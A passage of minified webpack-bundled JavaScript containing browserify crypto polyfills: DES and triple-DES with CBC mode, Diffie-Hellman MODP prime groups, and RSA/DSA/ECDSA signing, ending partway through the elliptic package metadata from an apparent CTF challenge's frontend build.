        n[i + 0] = r >>> 0, n[i + 1] = o >>> 0 }, t.pc1 = function(e, t, n, i) { for (var r = 0, o = 0, a = 7; a >= 5; a--) { for (var s = 0; s <= 24; s += 8) r <<= 1, r |= t >> s + a & 1; for (var s = 0; s <= 24; s += 8) r <<= 1, r |= e >> s + a & 1 } for (var s = 0; s <= 24; s += 8) r <<= 1, r |= t >> s + a & 1; for (var a = 1; a <= 3; a++) { for (var s = 0; s <= 24; s += 8) o <<= 1, o |= t >> s + a & 1; for (var s = 0; s <= 24; s += 8) o <<= 1, o |= e >> s + a & 1 } for (var s = 0; s <= 24; s += 8) o <<= 1, o |= e >> s + a & 1;
        n[i + 0] = r >>> 0, n[i + 1] = o >>> 0 }, t.r28shl = function(e, t) { return e << t & 268435455 | e >>> 28 - t }; var i = [14, 11, 17, 4, 27, 23, 25, 0, 13, 22, 7, 18, 5, 9, 16, 24, 2, 20, 12, 21, 1, 8, 15, 26, 15, 4, 25, 19, 9, 1, 26, 16, 5, 11, 23, 8, 12, 7, 17, 0, 22, 3, 10, 14, 6, 20, 27, 24];
    t.pc2 = function(e, t, n, r) { for (var o = 0, a = 0, s = i.length >>> 1, c = 0; c < s; c++) o <<= 1, o |= e >>> i[c] & 1; for (var c = s; c < i.length; c++) a <<= 1, a |= t >>> i[c] & 1;
        n[r + 0] = o >>> 0, n[r + 1] = a >>> 0 }, t.expand = function(e, t, n) { var i = 0,
            r = 0;
        i = (1 & e) << 5 | e >>> 27; for (var o = 23; o >= 15; o -= 4) i <<= 6, i |= e >>> o & 63; for (var o = 11; o >= 3; o -= 4) r |= e >>> o & 63, r <<= 6;
        r |= (31 & e) << 1 | e >>> 31, t[n + 0] = i >>> 0, t[n + 1] = r >>> 0 }; var r = [14, 0, 4, 15, 13, 7, 1, 4, 2, 14, 15, 2, 11, 13, 8, 1, 3, 10, 10, 6, 6, 12, 12, 11, 5, 9, 9, 5, 0, 3, 7, 8, 4, 15, 1, 12, 14, 8, 8, 2, 13, 4, 6, 9, 2, 1, 11, 7, 15, 5, 12, 11, 9, 3, 7, 14, 3, 10, 10, 0, 5, 6, 0, 13, 15, 3, 1, 13, 8, 4, 14, 7, 6, 15, 11, 2, 3, 8, 4, 14, 9, 12, 7, 0, 2, 1, 13, 10, 12, 6, 0, 9, 5, 11, 10, 5, 0, 13, 14, 8, 7, 10, 11, 1, 10, 3, 4, 15, 13, 4, 1, 2, 5, 11, 8, 6, 12, 7, 6, 12, 9, 0, 3, 5, 2, 14, 15, 9, 10, 13, 0, 7, 9, 0, 14, 9, 6, 3, 3, 4, 15, 6, 5, 10, 1, 2, 13, 8, 12, 5, 7, 14, 11, 12, 4, 11, 2, 15, 8, 1, 13, 1, 6, 10, 4, 13, 9, 0, 8, 6, 15, 9, 3, 8, 0, 7, 11, 4, 1, 15, 2, 14, 12, 3, 5, 11, 10, 5, 14, 2, 7, 12, 7, 13, 13, 8, 14, 11, 3, 5, 0, 6, 6, 15, 9, 0, 10, 3, 1, 4, 2, 7, 8, 2, 5, 12, 11, 1, 12, 10, 4, 14, 15, 9, 10, 3, 6, 15, 9, 0, 0, 6, 12, 10, 11, 1, 7, 13, 13, 8, 15, 9, 1, 4, 3, 5, 14, 11, 5, 12, 2, 7, 8, 2, 4, 14, 2, 14, 12, 11, 4, 2, 1, 12, 7, 4, 10, 7, 11, 13, 6, 1, 8, 5, 5, 0, 3, 15, 15, 10, 13, 3, 0, 9, 14, 8, 9, 6, 4, 11, 2, 8, 1, 12, 11, 7, 10, 1, 13, 14, 7, 2, 8, 13, 15, 6, 9, 15, 12, 0, 5, 9, 6, 10, 3, 4, 0, 5, 14, 3, 12, 10, 1, 15, 10, 4, 15, 2, 9, 7, 2, 12, 6, 9, 8, 5, 0, 6, 13, 1, 3, 13, 4, 14, 14, 0, 7, 11, 5, 3, 11, 8, 9, 4, 14, 3, 15, 2, 5, 12, 2, 9, 8, 5, 12, 15, 3, 10, 7, 11, 0, 14, 4, 1, 10, 7, 1, 6, 13, 0, 11, 8, 6, 13, 4, 13, 11, 0, 2, 11, 14, 7, 15, 4, 0, 9, 8, 1, 13, 10, 3, 14, 12, 3, 9, 5, 7, 12, 5, 2, 10, 15, 6, 8, 1, 6, 1, 6, 4, 11, 11, 13, 13, 8, 12, 1, 3, 4, 7, 10, 14, 7, 10, 9, 15, 5, 6, 0, 8, 15, 0, 14, 5, 2, 9, 3, 2, 12, 13, 1, 2, 15, 8, 13, 4, 8, 6, 10, 15, 3, 11, 7, 1, 4, 10, 12, 9, 5, 3, 6, 14, 11, 5, 0, 0, 14, 12, 9, 7, 2, 7, 2, 11, 1, 4, 14, 1, 7, 9, 4, 12, 10, 14, 8, 2, 13, 0, 15, 6, 12, 10, 9, 13, 0, 15, 3, 3, 5, 5, 6, 8, 11];
    t.substitute = function(e, t) { for (var n = 0, i = 0; i < 4; i++) { var o = e >>> 18 - 6 * i & 63,
                a = r[64 * i + o];
            n <<= 4, n |= a } for (var i = 0; i < 4; i++) { var o = t >>> 18 - 6 * i & 63,
                a = r[256 + 64 * i + o];
            n <<= 4, n |= a } return n >>> 0 }; var o = [16, 25, 12, 11, 3, 20, 4, 15, 31, 17, 9, 6, 27, 14, 1, 22, 30, 24, 8, 18, 0, 5, 29, 23, 13, 19, 2, 26, 10, 21, 28, 7];
    t.permute = function(e) { for (var t = 0, n = 0; n < o.length; n++) t <<= 1, t |= e >>> o[n] & 1; return t >>> 0 }, t.padSplit = function(e, t, n) { for (var i = e.toString(2); i.length < t;) i = "0" + i; for (var r = [], o = 0; o < t; o += n) r.push(i.slice(o, o + n)); return r.join(" ") } }, function(e, t, n) { "use strict";

    function i(e) { this.options = e, this.type = this.options.type, this.blockSize = 8, this._init(), this.buffer = new Array(this.blockSize), this.bufferOff = 0 } var r = n(5);
    e.exports = i, i.prototype._init = function() {}, i.prototype.update = function(e) { return 0 === e.length ? [] : "decrypt" === this.type ? this._updateDecrypt(e) : this._updateEncrypt(e) }, i.prototype._buffer = function(e, t) { for (var n = Math.min(this.buffer.length - this.bufferOff, e.length - t), i = 0; i < n; i++) this.buffer[this.bufferOff + i] = e[t + i]; return this.bufferOff += n, n }, i.prototype._flushBuffer = function(e, t) { return this._update(this.buffer, 0, e, t), this.bufferOff = 0, this.blockSize }, i.prototype._updateEncrypt = function(e) { var t = 0,
            n = 0,
            i = (this.bufferOff + e.length) / this.blockSize | 0,
            r = new Array(i * this.blockSize);
        0 !== this.bufferOff && (t += this._buffer(e, t), this.bufferOff === this.buffer.length && (n += this._flushBuffer(r, n))); for (var o = e.length - (e.length - t) % this.blockSize; t < o; t += this.blockSize) this._update(e, t, r, n), n += this.blockSize; for (; t < e.length; t++, this.bufferOff++) this.buffer[this.bufferOff] = e[t]; return r }, i.prototype._updateDecrypt = function(e) { for (var t = 0, n = 0, i = Math.ceil((this.bufferOff + e.length) / this.blockSize) - 1, r = new Array(i * this.blockSize); i > 0; i--) t += this._buffer(e, t), n += this._flushBuffer(r, n); return t += this._buffer(e, t), r }, i.prototype.final = function(e) { var t;
        e && (t = this.update(e)); var n; return n = "encrypt" === this.type ? this._finalEncrypt() : this._finalDecrypt(), t ? t.concat(n) : n }, i.prototype._pad = function(e, t) { if (0 === t) return !1; for (; t < e.length;) e[t++] = 0; return !0 }, i.prototype._finalEncrypt = function() { if (!this._pad(this.buffer, this.bufferOff)) return []; var e = new Array(this.blockSize); return this._update(this.buffer, 0, e, 0), e }, i.prototype._unpad = function(e) { return e }, i.prototype._finalDecrypt = function() { r.equal(this.bufferOff, this.blockSize, "Not enough data to decrypt"); var e = new Array(this.blockSize); return this._flushBuffer(e, 0), this._unpad(e) } }, function(e, t, n) { "use strict";

    function i() { this.tmp = new Array(2), this.keys = null }

    function r(e) { u.call(this, e); var t = new i;
        this._desState = t, this.deriveKeys(t, e.key) } var o = n(5),
        a = n(0),
        s = n(34),
        c = s.utils,
        u = s.Cipher;
    a(r, u), e.exports = r, r.create = function(e) { return new r(e) }; var l = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1];
    r.prototype.deriveKeys = function(e, t) { e.keys = new Array(32), o.equal(t.length, this.blockSize, "Invalid key length"); var n = c.readUInt32BE(t, 0),
            i = c.readUInt32BE(t, 4);
        c.pc1(n, i, e.tmp, 0), n = e.tmp[0], i = e.tmp[1]; for (var r = 0; r < e.keys.length; r += 2) { var a = l[r >>> 1];
            n = c.r28shl(n, a), i = c.r28shl(i, a), c.pc2(n, i, e.keys, r) } }, r.prototype._update = function(e, t, n, i) { var r = this._desState,
            o = c.readUInt32BE(e, t),
            a = c.readUInt32BE(e, t + 4);
        c.ip(o, a, r.tmp, 0), o = r.tmp[0], a = r.tmp[1], "encrypt" === this.type ? this._encrypt(r, o, a, r.tmp, 0) : this._decrypt(r, o, a, r.tmp, 0), o = r.tmp[0], a = r.tmp[1], c.writeUInt32BE(n, o, i), c.writeUInt32BE(n, a, i + 4) }, r.prototype._pad = function(e, t) { for (var n = e.length - t, i = t; i < e.length; i++) e[i] = n; return !0 }, r.prototype._unpad = function(e) { for (var t = e[e.length - 1], n = e.length - t; n < e.length; n++) o.equal(e[n], t); return e.slice(0, e.length - t) }, r.prototype._encrypt = function(e, t, n, i, r) { for (var o = t, a = n, s = 0; s < e.keys.length; s += 2) { var u = e.keys[s],
                l = e.keys[s + 1];
            c.expand(a, e.tmp, 0), u ^= e.tmp[0], l ^= e.tmp[1]; var d = c.substitute(u, l),
                f = c.permute(d),
                h = a;
            a = (o ^ f) >>> 0, o = h } c.rip(a, o, i, r) }, r.prototype._decrypt = function(e, t, n, i, r) { for (var o = n, a = t, s = e.keys.length - 2; s >= 0; s -= 2) { var u = e.keys[s],
                l = e.keys[s + 1];
            c.expand(o, e.tmp, 0), u ^= e.tmp[0], l ^= e.tmp[1]; var d = c.substitute(u, l),
                f = c.permute(d),
                h = o;
            o = (a ^ f) >>> 0, a = h } c.rip(o, a, i, r) } }, function(e, t, n) { "use strict";

    function i(e) { o.equal(e.length, 8, "Invalid IV length"), this.iv = new Array(8); for (var t = 0; t < this.iv.length; t++) this.iv[t] = e[t] }

    function r(e) {
        function t(t) { e.call(this, t), this._cbcInit() } a(t, e); for (var n = Object.keys(s), i = 0; i < n.length; i++) { var r = n[i];
            t.prototype[r] = s[r] } return t.create = function(e) { return new t(e) }, t } var o = n(5),
        a = n(0),
        s = {};
    t.instantiate = r, s._cbcInit = function() { var e = new i(this.options.iv);
        this._cbcState = e }, s._update = function(e, t, n, i) { var r = this._cbcState,
            o = this.constructor.super_.prototype,
            a = r.iv; if ("encrypt" === this.type) { for (var s = 0; s < this.blockSize; s++) a[s] ^= e[t + s];
            o._update.call(this, a, 0, n, i); for (var s = 0; s < this.blockSize; s++) a[s] = n[i + s] } else { o._update.call(this, e, t, n, i); for (var s = 0; s < this.blockSize; s++) n[i + s] ^= a[s]; for (var s = 0; s < this.blockSize; s++) a[s] = e[t + s] } } }, function(e, t, n) { "use strict";

    function i(e, t) { o.equal(t.length, 24, "Invalid key length"); var n = t.slice(0, 8),
            i = t.slice(8, 16),
            r = t.slice(16, 24);
        this.ciphers = "encrypt" === e ? [u.create({ type: "encrypt", key: n }), u.create({ type: "decrypt", key: i }), u.create({ type: "encrypt", key: r })] : [u.create({ type: "decrypt", key: r }), u.create({ type: "encrypt", key: i }), u.create({ type: "decrypt", key: n })] }

    function r(e) { c.call(this, e); var t = new i(this.type, this.options.key);
        this._edeState = t } var o = n(5),
        a = n(0),
        s = n(34),
        c = s.Cipher,
        u = s.DES;
    a(r, c), e.exports = r, r.create = function(e) { return new r(e) }, r.prototype._update = function(e, t, n, i) { var r = this._edeState;
        r.ciphers[0]._update(e, t, n, i), r.ciphers[1]._update(n, i, n, i), r.ciphers[2]._update(n, i, n, i) }, r.prototype._pad = u.prototype._pad, r.prototype._unpad = u.prototype._unpad }, function(e, t) { t["des-ecb"] = { key: 8, iv: 0 }, t["des-cbc"] = t.des = { key: 8, iv: 8 }, t["des-ede3-cbc"] = t.des3 = { key: 24, iv: 8 }, t["des-ede3"] = { key: 24, iv: 0 }, t["des-ede-cbc"] = { key: 16, iv: 8 }, t["des-ede"] = { key: 16, iv: 0 } }, function(e, t, n) {
    (function(e) {
        function i(t) { var n = new e(a[t].prime, "hex"),
                i = new e(a[t].gen, "hex"); return new s(n, i) }

        function r(t, n, i, a) { return e.isBuffer(n) || void 0 === c[n] ? r(t, "binary", n, i) : (n = n || "binary", a = a || "binary", i = i || new e([2]), e.isBuffer(i) || (i = new e(i, a)), "number" == typeof t ? new s(o(t, i), i, !0) : (e.isBuffer(t) || (t = new e(t, n)), new s(t, i, !0))) } var o = n(55),
            a = n(117),
            s = n(118),
            c = { binary: !0, hex: !0, base64: !0 };
        t.DiffieHellmanGroup = t.createDiffieHellmanGroup = t.getDiffieHellman = i, t.createDiffieHellman = t.DiffieHellman = r }).call(t, n(2).Buffer) }, function(e, t) { e.exports = function(e) { return e.webpackPolyfill || (e.deprecate = function() {}, e.paths = [], e.children || (e.children = []), Object.defineProperty(e, "loaded", { enumerable: !0, get: function() { return e.l } }), Object.defineProperty(e, "id", { enumerable: !0, get: function() { return e.i } }), e.webpackPolyfill = 1), e } }, function(e, t) {}, function(e, t) {}, function(e, t) { e.exports = { modp1: { gen: "02", prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a63a3620ffffffffffffffff" }, modp2: { gen: "02", prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff" }, modp5: { gen: "02", prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff" }, modp14: { gen: "02", prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff" }, modp15: { gen: "02", prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a93ad2caffffffffffffffff" }, modp16: { gen: "02", prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a92108011a723c12a787e6d788719a10bdba5b2699c327186af4e23c1a946834b6150bda2583e9ca2ad44ce8dbbbc2db04de8ef92e8efc141fbecaa6287c59474e6bc05d99b2964fa090c3a2233ba186515be7ed1f612970cee2d7afb81bdd762170481cd0069127d5b05aa993b4ea988d8fddc186ffb7dc90a6c08f4df435c934063199ffffffffffffffff" }, modp17: { gen: "02", prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a92108011a723c12a787e6d788719a10bdba5b2699c327186af4e23c1a946834b6150bda2583e9ca2ad44ce8dbbbc2db04de8ef92e8efc141fbecaa6287c59474e6bc05d99b2964fa090c3a2233ba186515be7ed1f612970cee2d7afb81bdd762170481cd0069127d5b05aa993b4ea988d8fddc186ffb7dc90a6c08f4df435c93402849236c3fab4d27c7026c1d4dcb2602646dec9751e763dba37bdf8ff9406ad9e530ee5db382f413001aeb06a53ed9027d831179727b0865a8918da3edbebcf9b14ed44ce6cbaced4bb1bdb7f1447e6cc254b332051512bd7af426fb8f401378cd2bf5983ca01c64b92ecf032ea15d1721d03f482d7ce6e74fef6d55e702f46980c82b5a84031900b1c9e59e7c97fbec7e8f323a97a7e36cc88be0f1d45b7ff585ac54bd407b22b4154aacc8f6d7ebf48e1d814cc5ed20f8037e0a79715eef29be32806a1d58bb7c5da76f550aa3d8a1fbff0eb19ccb1a313d55cda56c9ec2ef29632387fe8d76e3c0468043e8f663f4860ee12bf2d5b0b7474d6e694f91e6dcc4024ffffffffffffffff" }, modp18: { gen: "02", prime: "ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a92108011a723c12a787e6d788719a10bdba5b2699c327186af4e23c1a946834b6150bda2583e9ca2ad44ce8dbbbc2db04de8ef92e8efc141fbecaa6287c59474e6bc05d99b2964fa090c3a2233ba186515be7ed1f612970cee2d7afb81bdd762170481cd0069127d5b05aa993b4ea988d8fddc186ffb7dc90a6c08f4df435c93402849236c3fab4d27c7026c1d4dcb2602646dec9751e763dba37bdf8ff9406ad9e530ee5db382f413001aeb06a53ed9027d831179727b0865a8918da3edbebcf9b14ed44ce6cbaced4bb1bdb7f1447e6cc254b332051512bd7af426fb8f401378cd2bf5983ca01c64b92ecf032ea15d1721d03f482d7ce6e74fef6d55e702f46980c82b5a84031900b1c9e59e7c97fbec7e8f323a97a7e36cc88be0f1d45b7ff585ac54bd407b22b4154aacc8f6d7ebf48e1d814cc5ed20f8037e0a79715eef29be32806a1d58bb7c5da76f550aa3d8a1fbff0eb19ccb1a313d55cda56c9ec2ef29632387fe8d76e3c0468043e8f663f4860ee12bf2d5b0b7474d6e694f91e6dbe115974a3926f12fee5e438777cb6a932df8cd8bec4d073b931ba3bc832b68d9dd300741fa7bf8afc47ed2576f6936ba424663aab639c5ae4f5683423b4742bf1c978238f16cbe39d652de3fdb8befc848ad922222e04a4037c0713eb57a81a23f0c73473fc646cea306b4bcbc8862f8385ddfa9d4b7fa2c087e879683303ed5bdd3a062b3cf5b3a278a66d2a13f83f44f82ddf310ee074ab6a364597e899a0255dc164f31cc50846851df9ab48195ded7ea1b1d510bd7ee74d73faf36bc31ecfa268359046f4eb879f924009438b481c6cd7889a002ed5ee382bc9190da6fc026e479558e4475677e9aa9e3050e2765694dfc81f56e880b96e7160c980dd98edd3dfffffffffffffffff" } } }, function(e, t, n) {
    (function(t) {
        function i(e, n) { return n = n || "utf8", t.isBuffer(e) || (e = new t(e, n)), this._pub = new c(e), this }

        function r(e, n) { return n = n || "utf8", t.isBuffer(e) || (e = new t(e, n)), this._priv = new c(e), this }

        function o(e, t) { var n = t.toString("hex"),
                i = [n, e.toString(16)].join("_"); if (i in v) return v[i]; var r = 0; if (e.isEven() || !m.simpleSieve || !m.fermatTest(e) || !l.test(e)) return r += 1, r += "02" === n || "05" === n ? 8 : 4, v[i] = r, r;
            l.test(e.shrn(1)) || (r += 2); var o; switch (n) {
                case "02":
                    e.mod(d).cmp(f) && (r += 8); break;
                case "05":
                    o = e.mod(h), o.cmp(p) && o.cmp(b) && (r += 8); break;
                default:
                    r += 4 } return v[i] = r, r }

        function a(e, t, n) { this.setGenerator(t), this.__prime = new c(e), this._prime = c.mont(this.__prime), this._primeLen = e.length, this._pub = void 0, this._priv = void 0, this._primeCode = void 0, n ? (this.setPublicKey = i, this.setPrivateKey = r) : this._primeCode = 8 }

        function s(e, n) { var i = new t(e.toArray()); return n ? i.toString(n) : i } var c = n(3),
            u = n(56),
            l = new u,
            d = new c(24),
            f = new c(11),
            h = new c(10),
            p = new c(3),
            b = new c(7),
            m = n(55),
            g = n(11);
        e.exports = a; var v = {};
        Object.defineProperty(a.prototype, "verifyError", { enumerable: !0, get: function() { return "number" != typeof this._primeCode && (this._primeCode = o(this.__prime, this.__gen)), this._primeCode } }), a.prototype.generateKeys = function() { return this._priv || (this._priv = new c(g(this._primeLen))), this._pub = this._gen.toRed(this._prime).redPow(this._priv).fromRed(), this.getPublicKey() }, a.prototype.computeSecret = function(e) { e = new c(e), e = e.toRed(this._prime); var n = e.redPow(this._priv).fromRed(),
                i = new t(n.toArray()),
                r = this.getPrime(); if (i.length < r.length) { var o = new t(r.length - i.length);
                o.fill(0), i = t.concat([o, i]) } return i }, a.prototype.getPublicKey = function(e) { return s(this._pub, e) }, a.prototype.getPrivateKey = function(e) { return s(this._priv, e) }, a.prototype.getPrime = function(e) { return s(this.__prime, e) }, a.prototype.getGenerator = function(e) { return s(this._gen, e) }, a.prototype.setGenerator = function(e, n) { return n = n || "utf8", t.isBuffer(e) || (e = new t(e, n)), this.__gen = e, this._gen = new c(e), this } }).call(t, n(2).Buffer) }, function(e, t, n) {
    (function(t) {
        function i(e) { c.Writable.call(this); var t = f[e]; if (!t) throw new Error("Unknown message digest");
            this._hashType = t.hash, this._hash = s(t.hash), this._tag = t.id, this._signType = t.sign }

        function r(e) { c.Writable.call(this); var t = f[e]; if (!t) throw new Error("Unknown message digest");
            this._hash = s(t.hash), this._tag = t.id, this._signType = t.sign }

        function o(e) { return new i(e) }

        function a(e) { return new r(e) } var s = n(13),
            c = n(19),
            u = n(0),
            l = n(120),
            d = n(156),
            f = n(45);
        Object.keys(f).forEach(function(e) { f[e].id = new t(f[e].id, "hex"), f[e.toLowerCase()] = f[e] }), u(i, c.Writable), i.prototype._write = function(e, t, n) { this._hash.update(e), n() }, i.prototype.update = function(e, n) { return "string" == typeof e && (e = new t(e, n)), this._hash.update(e), this }, i.prototype.sign = function(e, t) { this.end(); var n = this._hash.digest(),
                i = l(n, e, this._hashType, this._signType, this._tag); return t ? i.toString(t) : i }, u(r, c.Writable), r.prototype._write = function(e, t, n) { this._hash.update(e), n() }, r.prototype.update = function(e, n) { return "string" == typeof e && (e = new t(e, n)), this._hash.update(e), this }, r.prototype.verify = function(e, n, i) { "string" == typeof n && (n = new t(n, i)), this.end(); var r = this._hash.digest(); return d(n, r, e, this._signType, this._tag) }, e.exports = { Sign: o, Verify: a, createSign: o, createVerify: a } }).call(t, n(2).Buffer) }, function(e, t, n) {
    (function(t) {
        function i(e, n, i, a, s) { var c = m(n); if (c.curve) { if ("ecdsa" !== a && "ecdsa/rsa" !== a) throw new Error("wrong private key type"); return r(e, c) } if ("dsa" === c.type) { if ("dsa" !== a) throw new Error("wrong private key type"); return o(e, c, i) } if ("rsa" !== a && "ecdsa/rsa" !== a) throw new Error("wrong private key type");
            e = t.concat([s, e]); for (var u = c.modulus.byteLength(), l = [0, 1]; e.length + l.length + 1 < u;) l.push(255);
            l.push(0); for (var d = -1; ++d < e.length;) l.push(e[d]); return h(l, c) }

        function r(e, n) { var i = g[n.curve.join(".")]; if (!i) throw new Error("unknown curve " + n.curve.join(".")); var r = new p(i),
                o = r.keyFromPrivate(n.privateKey),
                a = o.sign(e); return new t(a.toDER()) }

        function o(e, t, n) { for (var i, r = t.params.priv_key, o = t.params.p, u = t.params.q, f = t.params.g, h = new b(0), p = c(e, u).mod(u), m = !1, g = s(r, u, e, n); !1 === m;) i = l(u, g, n), h = d(f, i, o, u), m = i.invm(u).imul(p.add(r.mul(h))).mod(u), 0 === m.cmpn(0) && (m = !1, h = new b(0)); return a(h, m) }

        function a(e, n) { e = e.toArray(), n = n.toArray(), 128 & e[0] && (e = [0].concat(e)), 128 & n[0] && (n = [0].concat(n)); var i = e.length + n.length + 4,
                r = [48, i, 2, e.length]; return r = r.concat(e, [2, n.length], n), new t(r) }

        function s(e, n, i, r) { if (e = new t(e.toArray()), e.length < n.byteLength()) { var o = new t(n.byteLength() - e.length);
                o.fill(0), e = t.concat([o, e]) } var a = i.length,
                s = u(i, n),
                c = new t(a);
            c.fill(1); var l = new t(a); return l.fill(0), l = f(r, l).update(c).update(new t([0])).update(e).update(s).digest(), c = f(r, l).update(c).digest(), l = f(r, l).update(c).update(new t([1])).update(e).update(s).digest(), c = f(r, l).update(c).digest(), { k: l, v: c } }

        function c(e, t) { var n = new b(e),
                i = (e.length << 3) - t.bitLength(); return i > 0 && n.ishrn(i), n }

        function u(e, n) { e = c(e, n), e = e.mod(n); var i = new t(e.toArray()); if (i.length < n.byteLength()) { var r = new t(n.byteLength() - i.length);
                r.fill(0), i = t.concat([r, i]) } return i }

        function l(e, n, i) { var r, o;
            do { for (r = new t(0); 8 * r.length < e.bitLength();) n.v = f(i, n.k).update(n.v).digest(), r = t.concat([r, n.v]);
                o = c(r, e), n.k = f(i, n.k).update(n.v).update(new t([0])).digest(), n.v = f(i, n.k).update(n.v).digest() } while (-1 !== o.cmp(e)); return o }

        function d(e, t, n, i) { return e.toRed(b.mont(n)).redPow(t).fromRed().mod(i) } var f = n(44),
            h = n(35),
            p = n(4).ec,
            b = n(3),
            m = n(24),
            g = n(66);
        e.exports = i, e.exports.getKey = s, e.exports.makeKey = l }).call(t, n(2).Buffer) }, function(e, t) { e.exports = { _from: "elliptic@^6.0.0", _id: "elliptic@6.4.0", _inBundle: !1, _integrity: "sha1-ysmvh2LIWDYYcAPI3+GT5eLq5d8=", _location: "/elliptic", _phantomChildren: {}, _requested: { type: "range", registry: !0, raw: "elliptic@^6.0.0", name: "elliptic", escapedName: "elliptic", rawSpec: "^6.0.0", saveSpec: null, fetchSpec: "^6.0.0" }, _requiredBy: ["/browserify-sign", "/create-ecdh"], _resolved: "https://registry.npmjs.org/elliptic/-/elliptic-6.4.0.tgz", _shasum: "cac9af8762c85836187003c8dfe193e5e2eae5df", _spec: "elliptic@^6.0.0", _where: "C:\\Users\\st\\dev\\harekaze-ctf-problems\\net1\\src\\web\\frontend\\node_modules\\browserify-sign", author: { name: "Fedor Indutny", email: "fedor@indutny.com" }, bugs: { url: "https://github.com/indutny/elliptic/issues" }, bundleDependencies: !1, dependencies: { "bn.js": "^4.4.0", brorand: "^1.0.1", "hash.js": "^1.0.0", "hmac-drbg": "^1.0.0", inherits: "^2.0.1", "minimalistic-assert": "^1.0.0", "minimalistic-crypto-utils": "^1.0.0" }, deprecated: !1, description: "EC cryptography", devDependencies: { brfs: 